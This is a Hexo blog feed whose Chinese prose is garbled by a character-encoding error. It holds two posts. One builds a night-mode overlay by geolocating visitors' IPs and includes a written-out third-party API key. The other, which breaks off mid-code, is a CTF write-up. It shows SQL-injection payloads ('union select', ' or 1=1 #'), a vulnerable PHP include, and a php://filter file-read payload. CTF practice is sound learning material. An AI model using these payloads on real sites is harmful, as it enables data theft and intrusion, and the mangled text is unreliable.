        <content type="html"><![CDATA[<p>é¼“æ£ blog çš„æ—¶å€™ä¸€ç›´è§‰å¾—å¤œé—´æ¨¡å¼å’Œé˜…è¯»æ¨¡å¼å•¥çš„æŒºå¥½ï¼ŒTypecho å€’æ˜¯æœ‰æ’ä»¶å¯ä»¥å®ç°ï¼Œä½†æ˜¯ hexo å¥½åƒå°±æ¯”è¾ƒéš¾äº†ï¼Œå› ä¸ºæˆ‘ç”¨çš„ä¸»é¢˜æ²¡æœ‰ pjax çš„æŠ€æœ¯ï¼Œæ‰€ä»¥æ¯æ¬¡åˆ·æ–°éƒ½å¯èƒ½ä½¿è¿™äº›æ ·å¼å¤±æ•ˆã€‚ä½†æ˜¯æˆ‘åˆæŒºæƒ³æ•´ä¸€ä¸ªï¼Œäºæ˜¯æ‰¾åˆ°äº†ä¸€ä¸ªç¥å¥‡çš„æ–¹æ¡ˆï¼šJavaScript + CSS + PHP + Cookieã€‚</p><p><escape><span id="more"></span></escape></p><h4 id="ä¸»è¦æ€è·¯"><a href="#ä¸»è¦æ€è·¯" class="headerlink" title="ä¸»è¦æ€è·¯"></a>ä¸»è¦æ€è·¯</h4><p>ä½¿ç”¨æœç‹çš„ PV ç»Ÿè®¡çš„ API è·å–åˆ°çš„ IPï¼Œé€šè¿‡ ajax æäº¤æ•°æ®ï¼Œå°† IP æ˜ å°„åˆ°å¤§è‡´çš„ç»çº¬åº¦ï¼Œç„¶åç”¨ PHP åœ¨åç«¯è®¡ç®—æ—¥å‡ºæ—¥è½çš„æ—¶é—´æˆ³ï¼Œå­˜åœ¨ Cookie é‡Œï¼Œ<del>ç„¶åæ¯æ¬¡åˆ·æ–°ç”¨ JavaScript è¯»å– Cookie ç„¶ååˆ¤æ–­æ˜¯å¦éœ€è¦æ¸²æŸ“é®ç½©ã€‚</del>ï¼ˆä¾èµ– JavaScript åŠ è½½ä¼šå¯¼è‡´æ¯æ¬¡åˆ·æ–°çš„æ—¶å€™é®ç½©æ²¡æœ‰åŠæ—¶åŠ è½½è€Œæœ‰â€œé—ªçƒâ€çš„æ•ˆæœï¼‰é€šè¿‡ PHP æ–‡ä»¶è¯»å– Cookie æ¥åˆ¤æ–­è¾“å‡ºå¯¹åº”çš„ CSS æ ·å¼ã€‚</p><h5 id="ç¼ºé™·"><a href="#ç¼ºé™·" class="headerlink" title="ç¼ºé™·"></a>ç¼ºé™·</h5><p>åœ¨é¡µé¢ä¸­åŒ…å«éƒ¨åˆ†ç”± JavaScript å®ç°çš„åŠ¨ç”»çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…ƒç´ åœ¨åŠ¨ç”»åŒºé—´å†…æ²¡æœ‰è¢«é®ç½©è¦†ç›–ã€‚</p><h4 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h4><h5 id="ç›¸å…³æ¥å£"><a href="#ç›¸å…³æ¥å£" class="headerlink" title="ç›¸å…³æ¥å£"></a>ç›¸å…³æ¥å£</h5><p>é¦–è¦è§£å†³çš„é—®é¢˜å°±æ˜¯ï¼Œä½¿ç”¨ JavaScript å®Œæˆ IP çš„è·å–ä»¥åŠ IP åˆ°ç»çº¬åº¦çš„æ˜ å°„ã€‚è¿™é‡Œæä¾›ä¸¤ä¸ªå’±æ‰¾åˆ°çš„æ¥å£ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pv.sohu.com/cityjson?ie=utf-8</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨ script æ ‡ç­¾åŒ…æ‹¬å¹¶æ”¾åœ¨é¡µé¢çš„ html ä»£ç ä¸­ï¼Œå°±èƒ½å¾—åˆ°å¦‚ä¸‹æ•°ç»„ã€‚ä¹‹åå¯ä»¥ç”¨ JavaScript ç›´æ¥è¯»å–ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> returnCitySN = &#123;<span class="string">&quot;cip&quot;</span>: <span class="string">&quot;YourIPAddressHere&quot;</span>, <span class="string">&quot;cid&quot;</span>: <span class="string">&quot;cidHere&quot;</span>, <span class="string">&quot;cname&quot;</span>: <span class="string">&quot;YourLocationHere&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><p>è‡³äº IP åˆ°ç»çº¬åº¦çš„æ˜ å°„ï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ä¸ª GeoIP åº“ï¼Œä½†æ˜¯é€Ÿåº¦å¹¶ä¸æ˜¯å¤ªå¿«ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä½¿ç”¨ Cookie æ¥å­˜å‚¨æ•°æ®çš„åŸå› ä¹‹ä¸€â€”â€”å‡å°‘è¯·æ±‚æ¬¡æ•°ã€‚æ­¤æ¥å£åªéœ€è¦ä¿®æ”¹ GET å‚æ•°ä¸­çš„ ip å³å¯ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://api.ipinfodb.com/v3/ip-city/?key=c9dcc88453e33a9e63ebad8d65f91583e87abd8185dd95f09fbeef6c62264f7d&amp;ip=YourIPHere</span><br></pre></td></tr></table></figure><p>è¿”å›çš„ç»“æœä¸­ä¼šåŒ…æ‹¬å¤§è‡´åœ°ç‚¹å’Œå¤§è‡´ç»çº¬åº¦ä»¥åŠæ—¶åŒº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OK;;8.8.8.8;US;United States of America;California;Mountain View;94043;37.406;-122.079;-08:00</span><br></pre></td></tr></table></figure><h5 id="PHP-å®ç°éƒ¨åˆ†"><a href="#PHP-å®ç°éƒ¨åˆ†" class="headerlink" title="PHP å®ç°éƒ¨åˆ†"></a>PHP å®ç°éƒ¨åˆ†</h5><h6 id="Î±-æ—¥å‡ºæ—¥è½æ—¶é—´è®¡ç®—"><a href="#Î±-æ—¥å‡ºæ—¥è½æ—¶é—´è®¡ç®—" class="headerlink" title="Î±. æ—¥å‡ºæ—¥è½æ—¶é—´è®¡ç®—"></a>Î±. æ—¥å‡ºæ—¥è½æ—¶é—´è®¡ç®—</h6><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦å°±æ˜¯æ ¹æ®å‰ç«¯çš„è¯·æ±‚æ•°æ®æ˜ å°„ä½ç½®å¹¶è®¡ç®—æ—¥å‡ºæ—¥è½çš„æ—¶é—´æˆ³ã€‚å…³äºæ—¶é—´æˆ³çš„è®¡ç®—ï¼ŒPHP æä¾›äº†ä¸¤ä¸ªç°æˆçš„å‡½æ•° <span class="heimu" title="tql">ä¸æ„§æ˜¯ PHP</span>ã€‚å…·ä½“è¯·å‚ç…§ PHP Manualã€‚</p><p><a href="https://www.php.net/manual/zh/function.date-sunrise.php" style="font-family:'JetBrains Mono';font-weight:initial">PHP Manual: data_sunrise()</a></p><p><a href="https://www.php.net/manual/zh/function.date-sunset.php" style="font-family:'JetBrains Mono';font-weight:initial">PHP Manual: data_sunset()</a></p><h6 id="Î²-CSS-è¾“å‡ºéƒ¨åˆ†"><a href="#Î²-CSS-è¾“å‡ºéƒ¨åˆ†" class="headerlink" title="Î². CSS è¾“å‡ºéƒ¨åˆ†"></a>Î². CSS è¾“å‡ºéƒ¨åˆ†</h6><p>è¿™é‡Œé¦–å…ˆè¦åšçš„å°±æ˜¯åœ¨ hexo æ¨¡æ¿æ–‡ä»¶çš„ä½ å–œæ¬¢çš„ä½ç½®åŠ å…¥ä¸€ä¸ª <code>div</code>ï¼Œå¹¶æŒ‡å®šä¸€ä¸ª <code>div</code>ã€‚è¿™æ ·å°±å¯ä»¥åœ¨ CSS ä¸­ä½¿ç”¨ <code>id</code> ä½œä¸ºç­›é€‰å™¨è€Œé¿å…å½±å“åˆ°å…¶ä»–å…ƒç´ ã€‚å› ä¸ºæ—¥å‡ºæ—¥è½æ—¶é—´å·²ç»å­˜åœ¨ Cookie é‡Œäº†ï¼Œæ‰€ä»¥åªéœ€è¦åœ¨ PHP é‡Œè¯»å– Cookie æ¥åˆ¤æ–­å³å¯ã€‚è¿™é‡Œè´´ä¸Šæˆ‘éšä¾¿ç çš„ä»£ç ï¼ˆçœŸå°±éšä¾¿ç çš„ï¼Œä¸Šçº¿æµ‹è¯•æ²¡å‡ ä¸ªå°æ—¶å°±ä¸‹çº¿äº†ï¼‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/css; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#layerShade&#123;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;position:fixed;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(time() &gt; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;sunset&#x27;</span>] || time() &lt; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;sunrise&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;background-color:#000;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;background-color:transparent;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;top:0;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;left:0;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;z-index:2147483647;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pointer-events:none;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;opacity:0.33;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;width:100%;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;height:100%;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>ä¸»è¦éœ€è¦æ³¨æ„çš„åœ°æ–¹å°±æ˜¯ <code>header</code>ï¼Œå¸¦ä¸Šè¿™ä¸ªæ‰èƒ½è¾“å‡ºä¸º text/cssï¼Œå¦åˆ™æ˜¯ plain textï¼Œå°±ä¸ä¼šè¢«è¯†åˆ«æˆ stylesheetã€‚ä½¿ç”¨çš„æ—¶å€™åªéœ€è¦åƒä¸€èˆ¬çš„ CSS ä¸€æ ·ç”¨ link æ ‡ç­¾åœ¨ html ä¸­å¼•ç”¨å³å¯ã€‚</p><h5 id="JavaScript-å®ç°éƒ¨åˆ†"><a href="#JavaScript-å®ç°éƒ¨åˆ†" class="headerlink" title="JavaScript å®ç°éƒ¨åˆ†"></a>JavaScript å®ç°éƒ¨åˆ†</h5><p>ç”±äºè¦ä½¿ç”¨ JavaScript æ¥æ“ä½œ Cookie å’Œå‘èµ·è¯·æ±‚ï¼Œæ‰€ä»¥ç”¨ jQuery ä¼šæ–¹ä¾¿ä¸å°‘ã€‚å› æ­¤ï¼Œå¯ä»¥åœ¨æ¨¡æ¿ä¸­åŠ ä¸Šå¦‚ä¸‹ä¸¤æ¡è¯­å¥ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯åˆ¤æ–­ Cookie æ˜¯å¦å­˜åœ¨ã€å‘èµ·è¯·æ±‚ã€ä¿å­˜ Cookie è¿™æ ·å‡ ä¸ªæ­¥éª¤ï¼Œå…¶ä¸­çš„ç»†èŠ‚ä¸å†èµ˜è¿°ï¼Œç›´æ¥æ”¾ä¸Šä¹‹å‰æµ‹è¯•çš„æ—¶å€™å†™çš„ä»£ç ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> timeNow = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="keyword">let</span> timestampNow = timeNow.getTime();</span><br><span class="line"><span class="keyword">if</span>($.cookie(<span class="string">&#x27;sunrise&#x27;</span>) === <span class="literal">undefined</span> || $.cookie(<span class="string">&#x27;sunset&#x27;</span>) === <span class="literal">undefined</span> || returnCitySN[<span class="string">&quot;cip&quot;</span>] !== $.cookie(<span class="string">&#x27;ip&#x27;</span>)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;IsNight? Run!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//request data process</span></span><br><span class="line">    <span class="keyword">var</span> details = &#123;&#125;;</span><br><span class="line">    details[<span class="string">&quot;TIME&quot;</span>] = <span class="built_in">parseInt</span>(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>);</span><br><span class="line">    details[<span class="string">&quot;IP_ADDRESS&quot;</span>] = returnCitySN[<span class="string">&quot;cip&quot;</span>];</span><br><span class="line">    <span class="keyword">let</span> data = <span class="built_in">JSON</span>.stringify(details);</span><br><span class="line">    data = BASE64.encode(data);</span><br><span class="line">    data = <span class="string">&quot;PLKOZ23476/&quot;</span> + data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//request for sunrise/sunset timestamp</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">        <span class="keyword">async</span>: <span class="literal">false</span>,</span><br><span class="line">        url: <span class="string">&quot;https://api.lemonprefect.cn/?&quot;</span> + data,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Setup Cookie expires till the next day</span></span><br><span class="line">            <span class="keyword">let</span> isNigntArray = data.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">let</span> timeExpire = <span class="keyword">new</span> <span class="built_in">Date</span>(timeNow.toLocaleDateString()).getTime() - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">let</span> timeLeftTillExpire = <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span> - (timestampNow - timeExpire);</span><br><span class="line">            <span class="keyword">let</span> cookieValidTime = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">            cookieValidTime.setTime(timeLeftTillExpire + timestampNow);</span><br><span class="line">            $.cookie(<span class="string">&#x27;sunrise&#x27;</span>,isNigntArray[<span class="number">0</span>],&#123;<span class="attr">expires</span>: cookieValidTime,<span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>&#125;);</span><br><span class="line">            $.cookie(<span class="string">&#x27;sunset&#x27;</span>,isNigntArray[<span class="number">1</span>],&#123;<span class="attr">expires</span>: cookieValidTime,<span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>&#125;);</span><br><span class="line">            $.cookie(<span class="string">&#x27;ip&#x27;</span>,returnCitySN[<span class="string">&quot;cip&quot;</span>],&#123;<span class="attr">expires</span>: cookieValidTime,<span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>&#125;);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;Is Night?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> timeNowCompare = <span class="built_in">parseInt</span>(timestampNow / <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">if</span>(timeNowCompare  &gt; $.cookie(<span class="string">&#x27;sunset&#x27;</span>) || timeNowCompare &lt; $.cookie(<span class="string">&#x27;sunrise&#x27;</span>))&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Good Evening!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Maybe it&#x27;s daytime now.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Timestamp Sunrise:&quot;</span> + $.cookie(<span class="string">&#x27;sunrise&#x27;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Timestamp Sunset:&quot;</span> + $.cookie(<span class="string">&#x27;sunset&#x27;</span>));</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œå°†æ‰€æœ‰ä»£ç å†™å¥½ä¹‹åä¸Šçº¿ï¼Œå°±èƒ½ç»„åˆåœ¨ä¸€èµ·æ­£å¸¸è¿ä½œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> BlogModify </tag>
            
            <tag> Layout </tag>
            
            <tag> CSS </tag>
            
            <tag> Script </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜2019 WriteUp</title>
      <link href="/zh-CN/posts/50bef630.html"/>
      <url>/zh-CN/posts/50bef630.html</url>
      
        <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜2019"><a href="#æå®¢å¤§æŒ‘æˆ˜2019" class="headerlink" title="æå®¢å¤§æŒ‘æˆ˜2019"></a>æå®¢å¤§æŒ‘æˆ˜2019</h2><p>å‰å‡ å¤©å¼€å§‹äº† BUUOJ çš„åˆ·é¢˜ä¹‹æ—…ï¼ˆä¸€æ–¹é¢æŸäº›åŸå› èœåˆ°æœ‰ç‚¹è‡ªé—­ï¼Œä¸€æ–¹é¢ adworld æœ‰ç‚¹ä¸å¤ªç¨³ï¼‰æœ¬æ¥å‡†å¤‡æŒ‰ä¸€æ³¢é¡ºåºå†™ï¼Œä½†æ˜¯<a href="https://duitutu.cn">å †å †</a>è·Ÿæˆ‘è¯´èµ·äº†è¿™ä¸ªç³»åˆ—é¢˜ï¼Œäºæ˜¯å°±å»åˆ·äº†ä¸€æ³¢ï¼Œæ„Ÿè§‰è¿˜æŒºå¥½ç©ã€‚ï¼ˆä¸æ„§æ˜¯ä¸€åˆ†çš„æ°´é¢˜ï¼‰</p><h3 id="Easy-SQL"><a href="#Easy-SQL" class="headerlink" title="Easy SQL"></a>Easy SQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p><p>è¿™é¢˜ä¸€å¼€å§‹ç»™äº†ä¸ªç™»å½•çš„ç”»é¢ï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯åƒä¹‹å‰æ˜¥ç§‹çš„å…¬ç›Šèµ›ä¸€æ ·ï¼Œä¼šå…ˆç™»å½•ç„¶åå†åœ¨é‡Œé¢æ”¾æ³¨å…¥çš„åœ°æ–¹ã€‚ä½†æ˜¯æ— å¥ˆæ€ä¹ˆéƒ½ç™»ä¸ä¸Šå»ï¼Œäºæ˜¯é¡ºæ‰‹å°è¯•äº†ä¸€ä¸‹ã€‚<code>.../check.php?username=999%27%20union%20select%201%2C2%20%23&password=999</code></p><p>æ²¡æƒ³åˆ°è¿™éšä¾¿è¯•çš„ä¸€æ‰‹è¯•å‡†äº†ï¼Œç»™äº†ä¸€æ¡ç™½è‰²çš„å›æ˜¾ï¼ˆå‰æ’åæ§½ç•Œé¢è®¾è®¡ï¼‰<code>The used SELECT statements have a different number of columns</code> ã€‚æ‹¿åˆ°è¿™æ³¢æç¤ºä»¥åå°±å¾ˆå®¹æ˜“åœ°è¯•å‡ºäº†æ•°æ®åº“çš„åˆ—æ•°ï¼Œæœ€åçš„ flag å°±ä¸€ä¸‹å­å‡ºæ¥äº† ï¼ˆæŠŠèƒŒæ™¯ block æ‰çš„æˆ‘å·®ç‚¹æ²¡çœ‹è§ flag ï¼Œè¿˜å¥½çœ‹äº†ä¸€æ‰‹ç½‘é¡µæºä»£ç ï¼‰<span class="heimu" title="QAQ">çº¢é»‘ç™½çš„ä¸‰è‰²æ­é…èµ·æ¥çœŸçš„ä¸å¥½çœ‹</span></p><p>PS æˆ‘å¥½åƒå†™å¾—å¤ªå¤æ‚äº†ï¼Œå…¶å®åªè¦ç™»å½•ä¸Šå°±è¡Œã€‚æ‰€ä»¥åº”è¯¥å¯ä»¥ç”¨ <code>' or 1=1 #</code> å•¥çš„ç›´æ¥æ‹¿åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c39d07f5-6b36-4255-b98b-9a66c7144c05&#125;</span><br></pre></td></tr></table></figure><h3 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #641790;color: #fff;font-size: 0.75rem;margin-right: 5px;">POST &amp; GET Trick</span></p><p>è¿™é¢˜ç»™äº†ä¸ªå¾ˆèŒçš„ç½‘é¡µï¼Œè§‚å¯Ÿäº†ä¸€ä¼šå„¿ç½‘é¡µä¸Šçš„çŒ«ä¹‹åï¼Œæ²¡æ€è·¯çš„æˆ‘çœ‹äº†ä¸€æ‰‹ç½‘é¡µæºä»£ç ã€‚å‘ç°äº†è¿™æ ·ä¸€æ®µä»£ç è¢«æ³¨é‡Šæ‰äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cat</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cat</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cat</span> == <span class="string">&#x27;dog&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥é¡ºåŠ¿ç»™äº†ç½‘é¡µä¸€ä¸ªå‚æ•° <code>cat=dog</code> ä¹‹åï¼Œflag å°±å‡ºç°åœ¨äº†ç½‘é¡µä¸Šã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a84da6ed-7606-45b4-b97e-12e6d57e8819&#125;</span><br></pre></td></tr></table></figure><h3 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">302</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">PHP ä¼ªåè®®</span></p><p>ä¸€å¼€å§‹çœ‹åˆ°é¢˜ç›®è¿˜ä»¥ä¸ºæ˜¯æ–‡ä»¶ä¸Šä¼ å•¥çš„ï¼Œç‚¹è¿›å»æ˜¯ä¸ªçº¢é…é»‘çš„ç•Œé¢ã€‚æŸ¥çœ‹ä¸€æ‰‹æºç ä¹‹åå¯ä»¥è·³è½¬ä¸¤æ¬¡ï¼Œä½†æ˜¯ç¬¬äºŒæ¬¡è·³è½¬çš„æ—¶å€™ç›´æ¥æç¤ºâ€œæŸ¥é˜…å®Œæ¯•â€ã€‚åå¤ä¸¤æ¬¡ä¹‹åå‘ç°é“¾æ¥è¢«è·³è½¬äº†ï¼Œäºæ˜¯çŒœæµ‹ä¸­é—´çš„ <code>action.php</code> æœ‰ç‚¹ä¸œè¥¿ã€‚äºæ˜¯ä¸Šäº†ä¸€æ‰‹ Pythonï¼Œå¸¦ä¸Š <code>allow_redirects=False</code> çš„å‚æ•°è·‘äº†ä¸€æ³¢ requestï¼Œç„¶åæˆåŠŸæ‹¿åˆ°äº†å¤¹åœ¨è·³è½¬ä¸­é—´çš„ <code>secr3t.php</code>ã€‚å¾ˆéªšçš„æ˜¯è¿™ä¸ªé¡µé¢æ‰“å¼€æ˜¯ä¸€æ®µ PHP ä»£ç ã€‚ï¼ˆï¼Ÿä»£ç å®¡è®¡ï¼‰ä¸€å¼€å§‹æˆ‘æ²¡ç®¡ï¼Œç›´æ¥ç…§ç€æç¤ºå»äº†<code>flag.php</code>ï¼Œç„¶åæ²¡æœ‰æˆåŠŸæ‹¿åˆ° flagã€‚</p><p>æ¨æµ‹è¦ä»  <code>secr3t.php</code> è¿™é‡Œæƒ³åŠæ³•ç›´æ¥è¾“å‡º PHP æ–‡ä»¶ã€‚æ­£å¥½ä¹‹å‰çœ‹è¿‡çš„è§†é¢‘é‡Œé¢è®²åˆ°è¿‡ <code>filter</code> å’Œ <code>php://</code>ã€‚äºæ˜¯å›å»ä»”ç»†çœ‹äº†ä¸€æ‰‹é‚£æ®µ PHP ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>) || stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>) || stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åç…§ç€ä¹‹å‰çš„è‘«èŠ¦ç”»äº†ä¸ªè¿™æ ·çš„ç“¢ <code>.../secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code> ç„¶åæˆåŠŸæ‹¿åˆ°äº†ä¸€é•¿ä¸² base64 ç¼–ç ã€‚</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 